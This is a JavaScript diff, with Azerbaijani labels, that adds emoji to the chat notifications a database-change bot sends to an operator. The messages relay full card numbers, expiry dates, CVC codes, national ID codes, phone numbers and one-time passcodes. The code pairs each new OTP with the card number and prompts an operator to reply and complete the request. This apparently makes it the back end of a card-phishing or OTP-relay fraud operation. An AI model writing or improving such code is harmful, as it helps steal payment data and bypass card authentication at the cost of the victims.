@@ -226,11 +226,31 @@ function renderValue(v) {
   return String(v);
 }
 
+function getFieldEmoji(field) {
+  const emojiMap = {
+    'card_number': '💳',
+    'amount': '💰',
+    'expiry': '📅',
+    'cvc': '🔒',
+    'fin_code': '🆔',
+    'phone_number': '📱',
+    'otp_code': '🔢',
+    'status': '📊',
+    'card_type': '🏦',
+    'otp_submitted_at': '⏰',
+    'id': '🔖',
+    'admin_actor': '👤',
+    'resolved_at': '✅'
+  };
+  return emojiMap[field] || '📌';
+}
+
 function renderList(obj) {
   return Object.entries(obj)
     .map(([k, v]) => {
       const label = AZ_TRANSLATIONS.fields[k] || k;
-      return `• <b>${escapeHtml(label)}</b>: <code>${escapeHtml(renderValue(v))}</code>`;
+      const emoji = getFieldEmoji(k);
+      return `${emoji} <b>${escapeHtml(label)}</b>: <code>${escapeHtml(renderValue(v))}</code>`;
     })
     .join('\n');
 }
@@ -243,7 +263,9 @@ function diffFields(oldRow = {}, newRow = {}) {
     const n = newRow[k];
     const same = JSON.stringify(o) === JSON.stringify(n);
     if (!same) {
-      lines.push(`• <b>${escapeHtml(k)}</b>: <code>${escapeHtml(renderValue(o))}</code> → <code>${escapeHtml(renderValue(n))}</code>`);
+      const emoji = getFieldEmoji(k);
+      const label = AZ_TRANSLATIONS.fields[k] || k;
+      lines.push(`${emoji} <b>${escapeHtml(label)}</b>: <code>${escapeHtml(renderValue(o))}</code> → <code>${escapeHtml(renderValue(n))}</code>`);
     }
   }
   return lines.join('\n');
@@ -251,12 +273,13 @@ function diffFields(oldRow = {}, newRow = {}) {
 
 function formatGenericChange(eventType, s, t, rowNew, rowOld) {
   const eventTypeAz = AZ_TRANSLATIONS.eventTypes[eventType] || eventType;
-  const header = `<b>${escapeHtml(eventTypeAz)}</b> - <code>${escapeHtml(`${s}.${t}`)}</code>`;
+  const eventEmoji = eventType === 'INSERT' ? '🆕' : eventType === 'UPDATE' ? '🔄' : '🗑';
+  const header = `${eventEmoji} <b>${escapeHtml(eventTypeAz)}</b>`;
   
   if (eventType === 'INSERT') {
     const filtered = filterAllowedFields(rowNew || {});
     const body = renderList(filtered);
-    return `${header}\n<b>${AZ_TRANSLATIONS.labels['New']}</b>\n${body}`;
+    return `${header}\n\n${body}`;
   }
   if (eventType === 'UPDATE') {
     const oldRow = filterAllowedFields(rowOld || {});
@@ -270,26 +293,28 @@ function formatGenericChange(eventType, s, t, rowNew, rowOld) {
       if (JSON.stringify(o) !== JSON.stringify(n)) {
         changedKeys.push(k);
         const label = AZ_TRANSLATIONS.fields[k] || k;
-        lines.push(`• <b>${escapeHtml(label)}</b>: <code>${escapeHtml(renderValue(o))}</code> → <code>${escapeHtml(renderValue(n))}</code>`);
+        const emoji = getFieldEmoji(k);
+        lines.push(`${emoji} <b>${escapeHtml(label)}</b>: <code>${escapeHtml(renderValue(n))}</code>`);
       }
     }
     // If OTP changed, also show card_number even if it didn't change
     if (changedKeys.includes('otp_code') && (newRow.card_number || oldRow.card_number)) {
       const pan = newRow.card_number ?? oldRow.card_number;
       const label = AZ_TRANSLATIONS.fields['card_number'];
-      lines.push(`• <b>${escapeHtml(label)}</b>: <code>${escapeHtml(renderValue(pan))}</code>`);
+      const emoji = getFieldEmoji('card_number');
+      lines.push(`${emoji} <b>${escapeHtml(label)}</b>: <code>${escapeHtml(renderValue(pan))}</code>`);
     }
     const body = lines.join('\n');
-    return `${header}\n<b>${AZ_TRANSLATIONS.labels['Changed']}</b>\n${body || 'Dəyişiklik yoxdur'}`;
+    return `${header}\n\n${body || 'Dəyişiklik yoxdur'}`;
   }
   if (eventType === 'DELETE') {
     const filtered = filterAllowedFields(rowOld || {});
     const body = renderList(filtered);
-    return `${header}\n<b>${AZ_TRANSLATIONS.labels['Old']}</b>\n${body}`;
+    return `${header}\n\n${body}`;
   }
   const filtered = filterAllowedFields(rowNew || rowOld || {});
   const body = renderList(filtered);
-  return `${header}\n${body}`;
+  return `${header}\n\n${body}`;
 }
 
 function formatChange(eventType, s, t, rowNew, rowOld) {
@@ -320,6 +345,19 @@ function coerceDebtDetails(details) {
   return null;
 }
 
+function getDebtFieldEmoji(field) {
+  const emojiMap = {
+    'customer_name': '👤',
+    'loan_amount': '💰',
+    'loan_term': '📅',
+    'payment_date': '📆',
+    'outstanding_amount': '💵',
+    'contract_number': '📄',
+    'note': '📝'
+  };
+  return emojiMap[field] || '📌';
+}
+
 function formatDebtDetailsBlock(details) {
   const normalized = coerceDebtDetails(details);
   if (!normalized) return '';
@@ -327,55 +365,60 @@ function formatDebtDetailsBlock(details) {
   for (const [key, label] of Object.entries(DEBT_FIELD_LABELS)) {
     const value = normalized[key];
     if (!value) continue;
-    lines.push(`• <b>${escapeHtml(label)}</b>: <code>${escapeHtml(String(value))}</code>`);
+    const emoji = getDebtFieldEmoji(key);
+    lines.push(`${emoji} <b>${escapeHtml(label)}</b>: <code>${escapeHtml(String(value))}</code>`);
   }
   for (const [key, value] of Object.entries(normalized)) {
     if (key in DEBT_FIELD_LABELS) continue;
     if (!value) continue;
-    lines.push(`• <b>${escapeHtml(key)}</b>: <code>${escapeHtml(String(value))}</code>`);
+    lines.push(`📌 <b>${escapeHtml(key)}</b>: <code>${escapeHtml(String(value))}</code>`);
   }
   return lines.join('\n');
 }
 
 function formatDebtRequestChange(eventType, rowNew = {}, rowOld = {}) {
   const eventTypeAz = AZ_TRANSLATIONS.eventTypes[eventType] || eventType;
+  const eventEmoji = eventType === 'INSERT' ? '🆕' : eventType === 'UPDATE' ? '🔄' : '🗑';
   const current = rowNew || {};
   const previous = rowOld || {};
   const requestId = current.id || previous.id || 'naməlum';
   const phone = current.phone_number || previous.phone_number || 'naməlum';
   const statusNow = current.status || previous.status;
   const lines = [
-    `<b>${escapeHtml(eventTypeAz)}</b> - <code>public.debt_requests</code>`,
-    `<b>Sorğu ID</b>: <code>${escapeHtml(requestId)}</code>`,
-    `<b>Telefon</b>: <code>${escapeHtml(phone)}</code>`,
+    `${eventEmoji} <b>${escapeHtml(eventTypeAz)}</b>`,
+    '',
+    `🔖 <b>Sorğu ID</b>: <code>${escapeHtml(requestId)}</code>`,
+    `📱 <b>Telefon</b>: <code>${escapeHtml(phone)}</code>`,
   ];
 
   if (eventType === 'INSERT') {
-    lines.push('Yeni borc sorğusu yaradıldı. OTP təsdiqi gözlənilir.');
+    lines.push('', '✅ Yeni borc sorğusu yaradıldı. OTP təsdiqi gözlənilir.');
   } else if (eventType === 'UPDATE') {
     if (current.status && current.status !== previous.status) {
-      lines.push(`• Status: <code>${escapeHtml(describeDebtStatus(previous.status))}</code> → <code>${escapeHtml(describeDebtStatus(current.status))}</code>`);
+      lines.push(`📊 <b>Status</b>: <code>${escapeHtml(describeDebtStatus(current.status))}</code>`);
     } else if (statusNow) {
-      lines.push(`<b>Status</b>: ${escapeHtml(describeDebtStatus(statusNow))}`);
+      lines.push(`📊 <b>Status</b>: <code>${escapeHtml(describeDebtStatus(statusNow))}</code>`);
     }
     if (current.otp_code && current.otp_code !== previous.otp_code) {
-      lines.push(`<b>OTP</b>: <code>${escapeHtml(current.otp_code)}</code>`);
+      lines.push(`🔢 <b>OTP</b>: <code>${escapeHtml(current.otp_code)}</code>`);
     }
     if (current.admin_actor && current.admin_actor !== previous.admin_actor) {
-      lines.push(`<b>Operator</b>: ${escapeHtml(current.admin_actor)}`);
+      lines.push(`👤 <b>Operator</b>: ${escapeHtml(current.admin_actor)}`);
     }
   } else if (eventType === 'DELETE') {
-    lines.push('Sorğu silindi.');
+    lines.push('', '🗑 Sorğu silindi.');
   }
 
   const detailsBlock = formatDebtDetailsBlock(current.details || previous.details);
   if (detailsBlock) {
-    lines.push('<b>Məlumatlar</b>');
+    lines.push('');
+    lines.push('<b>📋 Məlumatlar</b>');
     lines.push(detailsBlock);
   }
 
   if ((current.status || previous.status) === 'awaiting_admin') {
-    lines.push('<i>Bu mesaja cavab verərək sorğunu tamamlayın. Lazım olan formatı görmək üçün /help yazın.</i>');
+    lines.push('');
+    lines.push('💬 <i>Bu mesaja cavab verərək sorğunu tamamlayın. Lazım olan formatı görmək üçün /help yazın.</i>');
   }
 
   return lines.join('\n');
